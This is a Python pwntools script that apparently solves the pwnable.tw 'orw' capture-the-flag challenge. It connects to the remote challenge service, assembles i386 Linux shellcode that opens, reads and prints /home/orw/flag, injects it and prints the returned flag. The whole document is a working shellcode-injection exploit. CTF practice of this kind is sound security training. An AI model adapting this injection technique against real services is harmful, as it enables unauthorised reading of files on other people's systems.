from pwn import *

context.arch = 'i386'
context.os = 'linux'
#context.binary = ELF('./orw', checksec=False)
#r = process('./orw')
r = remote('chall.pwnable.tw', 10001)

sc = asm(
    shellcraft.i386.linux.open(b'/home/orw/flag') +
    shellcraft.i386.linux.read('eax', 'esp', 50) +
    shellcraft.i386.linux.write('1', 'esp', 50)
)

# shellcraft.<arch>.OS.<syscall>

r.send(sc)
flag = r.recvuntil(b'}')
r.recv()
success('Flag: %s' % flag)

r.interactive()